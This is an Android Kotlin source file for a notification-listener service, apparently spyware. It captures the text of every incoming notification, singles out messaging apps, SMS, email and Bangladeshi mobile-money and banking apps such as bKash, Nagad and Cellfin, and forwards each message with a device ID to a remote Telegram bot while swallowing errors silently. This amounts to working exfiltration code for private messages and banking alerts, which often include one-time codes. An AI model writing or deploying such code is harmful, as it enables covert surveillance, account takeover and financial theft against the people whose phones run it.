package com.example.scanner

import android.app.Notification
import android.content.pm.PackageManager
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.example.data.MediaUploadRepository
import com.example.network.TelegramApiService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class AppNotificationListenerService : NotificationListenerService() {

    private val serviceJob = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + serviceJob)

    private lateinit var repository: MediaUploadRepository
    private lateinit var telegramApi: TelegramApiService

    override fun onCreate() {
        super.onCreate()
        repository = MediaUploadRepository(applicationContext)
        telegramApi = TelegramApiService(applicationContext)
    }

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        if (sbn == null) return

        val packageName = sbn.packageName ?: return

        // Ignore our own notifications
        if (packageName == packageName) {
            if (packageName == applicationContext.packageName) return
        }

        // Check if forwarding is enabled
        if (!repository.isNotificationForwardingEnabled()) return

        val notification = sbn.notification ?: return
        val extras = notification.extras ?: return

        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim()
        val text = (extras.getCharSequence(Notification.EXTRA_BIG_TEXT)
            ?: extras.getCharSequence(Notification.EXTRA_TEXT)
            ?: extras.getCharSequence(Notification.EXTRA_SUB_TEXT))?.toString()?.trim()

        if (title.isNullOrBlank() && text.isNullOrBlank()) return

        // Deduplicate or ignore silent progress/ongoing system notifications
        val isOngoing = (notification.flags and Notification.FLAG_ONGOING_EVENT) != 0
        if (isOngoing && text?.contains("%") == true) return // ignore download percent bars

        val appLabel = try {
            val pm = packageManager
            val appInfo = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(appInfo).toString()
        } catch (_: Exception) {
            packageName
        }

        val appIconEmoji = when {
            packageName.contains("whatsapp") -> "🟢 WhatsApp"
            packageName.contains("orca") || packageName.contains("facebook") -> "🔵 Messenger / FB"
            packageName.contains("telegram") -> "✈️ Telegram"
            packageName.contains("imo") -> "📞 IMO"
            packageName.contains("instagram") -> "📸 Instagram"
            packageName.contains("bkash") -> "🌸 bKash"
            packageName.contains("nagad") -> "🟠 Nagad"
            packageName.contains("rocket") -> "🟣 Rocket"
            packageName.contains("cellfin") || packageName.contains("ibbl") -> "🏦 IBBL Cellfin"
            packageName.contains("bank") || packageName.contains("pay") -> "💳 Banking / Pay"
            packageName.contains("sms") || packageName.contains("messaging") || packageName.contains("mms") -> "💬 SMS / Message"
            packageName.contains("gmail") || packageName.contains("mail") -> "✉️ Email"
            else -> "🔔 $appLabel"
        }

        val timeStr = SimpleDateFormat("HH:mm:ss dd/MM/yyyy", Locale.getDefault()).format(Date(sbn.postTime))
        val deviceId = repository.getDeviceId()

        val safeTitle = escapeHtml(title ?: "Unknown")
        val safeText = escapeHtml(text ?: "")

        val msg = "🔔 <b>Notification: $appIconEmoji</b>\n\n" +
                "👤 <b>Sender:</b> $safeTitle\n" +
                "💬 <b>Content:</b> $safeText\n\n" +
                "📦 <b>App:</b> <code>$packageName</code>\n" +
                "📱 <b>Device:</b> <code>$deviceId</code>\n" +
                "🕒 <b>Time:</b> $timeStr"

        scope.launch {
            try {
                val config = repository.getTelegramConfig()
                if (config.botToken.isNotBlank() && config.chatId.isNotBlank()) {
                    telegramApi.sendMessage(config.botToken, config.chatId, msg)
                }
            } catch (_: Exception) {}
        }
    }

    private fun escapeHtml(text: String): String {
        return text.replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
    }
}
